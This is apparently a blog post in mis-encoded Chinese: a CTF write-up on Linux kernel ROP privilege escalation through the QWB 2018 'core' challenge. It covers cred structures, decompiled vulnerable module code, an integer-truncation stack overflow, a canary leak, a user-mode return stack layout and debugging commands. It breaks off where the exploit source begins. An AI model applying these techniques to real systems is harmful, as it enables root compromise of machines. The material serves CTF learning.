alt="image-20230816203017727"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Rop</title>
      <link href="/2023/08/14/kernel-rop/"/>
      <url>/2023/08/14/kernel-rop/</url>
      
        <content type="html"><![CDATA[<h2 id="è¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess-descriptorï¼‰"><a href="#è¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess-descriptorï¼‰" class="headerlink" title="è¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess descriptorï¼‰"></a>è¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess descriptorï¼‰</h2><p>åœ¨å†…æ ¸ä¸­ä½¿ç”¨ç»“æ„ä½“ <code>task_struct</code> è¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹,ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç <a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/sched.h#L629">include&#x2F;linux&#x2F;sched.h</a></p><p>task_structç»“æ„ä½“ä¸­çš„æƒé™ç®¡ç†éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong> æ˜¯ kernel ç”¨ä»¥åˆ¤æ–­ä¸€ä¸ªè¿›ç¨‹æƒé™çš„å‡­è¯ï¼Œåœ¨ kernel ä¸­ä½¿ç”¨ <code>cred</code> ç»“æ„ä½“è¿›è¡Œæ ‡è¯†ï¼Œå¯¹äºä¸€ä¸ªè¿›ç¨‹è€Œè¨€åº”å½“æœ‰ä¸‰ä¸ª credï¼š</p><ul><li><strong>ptracer_credï¼š</strong>ä½¿ç”¨<code>ptrace</code>ç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªè¯¥è¿›ç¨‹çš„ä¸Šçº§è¿›ç¨‹çš„credï¼ˆgdbè°ƒè¯•ä¾¿æ˜¯ä½¿ç”¨äº†è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¸¸è§çš„åè°ƒè¯•æœºåˆ¶çš„åŸç†ä¾¿æ˜¯æå‰å ç”¨äº†è¿™ä¸ªä½ç½®ï¼‰</li><li><strong>real_credï¼š</strong>å³<strong>å®¢ä½“å‡­è¯</strong>ï¼ˆ<strong>objective cred</strong>ï¼‰ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè¿›ç¨‹æœ€åˆå¯åŠ¨æ—¶æ‰€å…·æœ‰çš„æƒé™</li><li><strong>credï¼š</strong>å³<strong>ä¸»ä½“å‡­è¯</strong>ï¼ˆ<strong>subjective cred</strong>ï¼‰ï¼Œè¯¥è¿›ç¨‹çš„æœ‰æ•ˆcredï¼Œkernelä»¥æ­¤ä½œä¸ºè¿›ç¨‹æƒé™çš„å‡­è¯</li></ul><p>credç»“æ„ä½“åœ¨<a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/cred.h#L111">include&#x2F;linux&#x2F;cred.h</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *    task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *    upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage; åŸå­è®¡æ•°å™¨ï¼Œç”¨äºè·Ÿè¸ªå¯¹è¯¥å®‰å…¨ä¸Šä¸‹æ–‡ç»“æ„çš„å¼•ç”¨æ•°é‡</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span> ä»»åŠ¡çš„å®é™…ç”¨æˆ·æ ‡è¯†</span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span> ä»»åŠ¡çš„å®é™…ç»„æ ‡è¯†ï¼ˆreal group IDï¼‰</span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span> ä»»åŠ¡çš„ä¿å­˜ç”¨æˆ·æ ‡è¯†ï¼ˆsaved user IDï¼‰ï¼Œåœ¨æƒé™åˆ‡æ¢æ—¶å¯èƒ½ç”¨åˆ°ã€‚</span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span> ä»»åŠ¡çš„ä¿å­˜ç»„æ ‡è¯†ï¼ˆsaved group IDï¼‰ï¼Œåœ¨æƒé™åˆ‡æ¢æ—¶å¯èƒ½ç”¨åˆ°ã€‚</span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span> ä»»åŠ¡çš„æœ‰æ•ˆç”¨æˆ·æ ‡è¯†ï¼ˆeffective user IDï¼‰ï¼Œç”¨äºæƒé™æ£€æŸ¥å’Œè®¿é—®æ§åˆ¶ã€‚</span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span> ä»»åŠ¡çš„æœ‰æ•ˆç»„æ ‡è¯†ï¼ˆeffective group IDï¼‰ï¼Œç”¨äºæƒé™æ£€æŸ¥å’Œè®¿é—®æ§åˆ¶ã€‚</span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span> ç”¨äºè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVFSï¼‰æ“ä½œçš„æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·æ ‡è¯†ï¼ˆfilesystem user IDï¼‰</span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span> ç”¨äºè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVFSï¼‰æ“ä½œçš„æ–‡ä»¶ç³»ç»Ÿç»„æ ‡è¯†ï¼ˆfilesystem group ID</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥æŠŠuidâ€“&gt;fsgid éƒ½ä¿®æ”¹ä¸º 0è·å¾—rootæƒé™</p><p>æˆ–è€…äº†åˆ©ç”¨ropæ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code>è·å¾—rootæƒé™</p><p>è‡ªä»å†…æ ¸ç‰ˆæœ¬ <strong>6.2</strong> èµ·ï¼Œ<code>prepare_kernel_cred(NULL)</code> å°†<strong>ä¸å†æ‹·è´ init_credï¼Œè€Œæ˜¯å°†å…¶è§†ä¸ºä¸€ä¸ªè¿è¡Œæ—¶é”™è¯¯å¹¶è¿”å› NULL</strong>ï¼Œåªèƒ½<code>commit_creds(&amp;init_cred)</code></p><blockquote><p><code>init_cred</code>æ˜¯<code>init</code> è¿›ç¨‹çš„ <code>cred</code> ï¼Œå› æ­¤å…¶æƒé™ä¸ºroot ,æ³„éœ²å‡ºå†…æ ¸åŸºå€ä¹‹å,å¦‚æœä¿æŠ¤å¼€çš„ä¸ç‰›xï¼Œæˆ‘ä»¬ä¹Ÿä¾¿èƒ½å¤Ÿè·å¾— <code>init_cred</code> çš„åœ°å€</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br><span class="line">è¯¥å‡½æ•°ç”¨ä»¥æ‹·è´ä¸€ä¸ªè¿›ç¨‹daemonçš„credç»“æ„ä½“ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„credç»“æ„ä½“</span><br><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">è¯¥å‡½æ•°ç”¨ä»¥å°†ä¸€ä¸ªæ–°çš„credç»“æ„ä½“åº”ç”¨åˆ°è¿›ç¨‹</span><br></pre></td></tr></table></figure><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ä¸»è¦æ˜¯åœ¨å†…æ ¸æ ˆæ ˆæº¢å‡ºï¼Œropæ‰§è¡Œç‰¹æƒå‡½æ•°ææƒåï¼Œè¿”å›ç”¨æˆ·æ€ï¼Œå†èµ·ä¸€ä¸ªshellå°±å¯ä»¥ç»§æ‰¿rootæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿”å›å‰è¦æŠŠæ ˆä¼ªé€ æˆæ­£å¸¸è¿›å…¥å†…æ ¸ææƒæ—¶çš„æ ˆ</p><p><img src="/2023/08/14/kernel-rop/image-20230816162903167.png" alt="image-20230816162903167"></p><p>ä¿å­˜å¥½ç”¨æˆ·æ ˆçš„æ¿å­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-masm=intel</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†…æ ¸æ—¶è¿”å›ç”¨æˆ·æ€</p><ul><li><code>swapgs</code>æŒ‡ä»¤æ¢å¤ç”¨æˆ·æ€ GS å¯„å­˜å™¨</li><li><code>sysretq</code>æˆ–è€…<code>iretq</code>æ¢å¤åˆ°ç”¨æˆ·ç©ºé—´</li></ul><p>è¿”å›ç”¨æˆ·æ€å‰ï¼Œå†…æ ¸æ ˆæ¿å­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">â†“      ææƒæ“ä½œçš„rop</span><br><span class="line">    swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2018-core"><a href="#å¼ºç½‘æ¯-2018-core" class="headerlink" title="å¼ºç½‘æ¯ 2018 - core"></a>å¼ºç½‘æ¯ 2018 - core</h2><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ">https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ</a><br>æå–ç ï¼šw9xj</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/Q/give_to_player&gt; checksec core.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h3><p>çœ‹ä¸‹initè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms &gt;/tmp/kallsyms #å¯ä»¥æ³„éœ²commit_credsï¼Œprepare_kernel_cred çš„å‡½æ•°çš„åœ°å€</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/kptr_restrict#é€šè¿‡cat /proc/kallsymsæŸ¥çœ‹å‡½æ•°åœ°å€æ—¶éƒ½æ˜¾ç¤º0</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/dmesg_restrict#ä¸èƒ½ç”¨dmesgæŸ¥çœ‹æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨è„šæœ¬"><a href="#å¯åŠ¨è„šæœ¬" class="headerlink" title="å¯åŠ¨è„šæœ¬"></a>å¯åŠ¨è„šæœ¬</h3><p>åªå¼€å¯äº†kaslr</p><h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p>åˆ›å»ºäº†ä¸ªè™šæ‹Ÿæ–‡ä»¶èŠ‚ç‚¹æ¥å’Œå†…æ ¸é€šä¿¡</p><p><code>struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);</code>å‡½æ•°å¯ä»¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªæ–‡ä»¶èŠ‚ç‚¹</p><ul><li><code>name</code>ï¼šæ–‡ä»¶å</li><li><code>mode</code>ï¼šæ–‡ä»¶è¯»å†™æ‰§è¡Œæƒé™</li><li><code>parent</code>ï¼šè¯¥æ–‡ä»¶æŒ‚è½½çš„procfsèŠ‚ç‚¹ï¼Œè‹¥ä¸ºNULLåˆ™è‡ªåŠ¨æŒ‚è½½åˆ°<code>/proc</code>ç›®å½•ä¸‹</li><li><code>proc_ops</code>ï¼šè¯¥æ–‡ä»¶çš„proc_opsç»“æ„ä½“</li></ul><p><code>remove_proc_entry(const char *, struct proc_dir_entry *)</code>ç”¨ä»¥æ³¨é”€æ­¤å‰åˆ›å»ºçš„æ–‡ä»¶</p><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶å</li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºå…¶æŒ‚è½½çš„èŠ‚ç‚¹ï¼Œè‹¥ä¸ºNULLåˆ™é»˜è®¤ä¸º<code>/proc</code>ç›®å½•</li></ul><p>è¿™é‡Œçš„ç»“æ„ä½“ç”šè‡³å‡½æ•°ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œæœ€å¥½è¿˜æ˜¯å»å½“å‰å†…æ ¸ç‰ˆæœ¬æºç é‡Œçœ‹ä¸€ä¸‹ <a href="https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692">https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">            <span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*clone_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *, <span class="type">loff_t</span>,</span><br><span class="line">            u64);</span><br><span class="line">    <span class="type">ssize_t</span> (*dedupe_file_range)(<span class="keyword">struct</span> file *, u64, u64, <span class="keyword">struct</span> file *,</span><br><span class="line">            u64);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®é‡Œé‡æ„äº†ä¸‹writeï¼Œunlocked_ioctlï¼Œreleaseåˆ†åˆ«å¯¹ç”¨ç”¨æˆ·æ€çš„writeï¼Œioctlï¼Œcloseå‡½æ•°</p><p>ioctlå‡½æ•°é‡Œçš„case 0x6677889Aï¼Œå­˜åœ¨æº¢å‡ºé—®é¢˜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­a1 &gt; 63æ—¶ç”¨çš„æ˜¯__int64ï¼Œqmemcpy(v2, &amp;name, (unsigned __int16)a1);æ—¶ç”¨çš„æ˜¯unsigned __int16,ç”¨ä¸€ä¸ªä½16bitè¾ƒå¤§çš„è´Ÿæ•°ï¼Œå¦‚(0xffffffffffff0000|(0x100))å¯ä»¥å®ç°å†…æ ¸æ ˆæº¢å‡º</p><p>è¿™é‡Œnameå¯ä»¥é€šè¿‡writeæ§åˆ¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ropåªéœ€è¦canaryå’Œcommit_creds(prepare_kernel_cred(NULL))å‡½æ•°åœ°å€</p><p>core_readä¸­çš„offå¯ä»¥é€šè¿‡case 0x6677889Cæ§åˆ¶ï¼Œå¯ä»¥æŠŠcanaryè¯»åˆ°æˆ‘ä»¬ç”¨æˆ·æ€å¾—å˜é‡é‡Œï¼Œæ³„éœ²canaryï¼Œå‡½æ•°åœ°å€å¯ä»¥é€šè¿‡&#x2F;tmp&#x2F;kallsymsæ¥æ³„éœ²</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºåªå¼€äº†kaslrï¼Œè¿™é“é¢˜æ–¹æ³•è¿˜æ˜¯è›®å¤šçš„</p><p>ä»è¿™é“é¢˜æ¥çœ‹ï¼Œæ„Ÿè§‰å†…æ ¸æ€canaryæ„Ÿè§‰æŒ‰ç…§rspç®—æ¯”è¾ƒå‡†ï¼Œrsp+0x40çš„ä½ç½®</p><p><img src="/2023/08/14/kernel-rop/image-20230816144106041.png" alt="image-20230816144106041"></p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>å…³æ‰kaslrè°ƒè¯•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file core.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002400&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b *(0x159+0xffffffffc0000000)&quot;</span><br><span class="line"><span class="meta prompt_">    # </span><span class="language-bash">-ex <span class="string">&quot;b core_ioctl&quot;</span></span> </span><br></pre></td></tr></table></figure><h3 id="commit-creds-amp-init-cred"><a href="#commit-creds-amp-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span 